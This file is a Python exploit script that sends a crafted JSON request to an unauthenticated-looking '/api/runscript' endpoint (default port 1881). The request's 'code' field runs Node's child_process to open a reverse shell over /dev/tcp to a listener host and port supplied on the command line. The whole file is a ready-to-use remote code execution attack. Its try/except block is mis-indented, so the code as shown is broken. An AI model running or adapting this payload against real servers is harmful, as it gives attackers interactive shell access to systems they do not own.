from argparse import RawTextHelpFormatter
import argparse, requests


def main(r_host, r_port,host,port):
    url = "http://" + r_host + ":" + r_port + "/api/runscript"
    payload = {
        "headers": {
                "normalizedNames":{},
                "lazyUpdate": "null"
            },
            "params":{
                "script":{
                    "parameters":[
                    {
                    "name":"ok",
                    "type":"tagid",
                    "value":""
                    }
                    ],
                    "mode":"",
                    "id":"",
                    "test":"true",
                    "name":"ok",
                    "outputId":"",
                    "code":"require('child_process').exec('/bin/bash -c \"/bin/sh -i >& /dev/tcp/%s/%s 0>&1\"')" % (host,port)
                }
            }
    }
    try:
        response = requests.post(url,json = payload)
        except requests.exceptions.ConnectionError:
        print("url connect error")



parser = argparse.ArgumentParser(formatter_class = RawTextHelpFormatter, usage="python exploit.py --rhost <ip> --rport <rport> --lhost <lhost> --lport <lport>")
parser.add_argument('--rhost', dest='rhost', action='store', type=str, help='insert an rhost', required = True)
parser.add_argument('--rport', dest='rport', action='store', type=str, help='insert an rport', default  = "1881")
parser.add_argument('--lhost', dest='lhost', action='store', type=str, help='insert an lhost', required = True)
parser.add_argument('--lport', dest='lport', action='store', type=str, help='insert an lport', required = True)
args = parser.parse_args()

main(args.rhost, args.rport, args.lhost, args.lport)
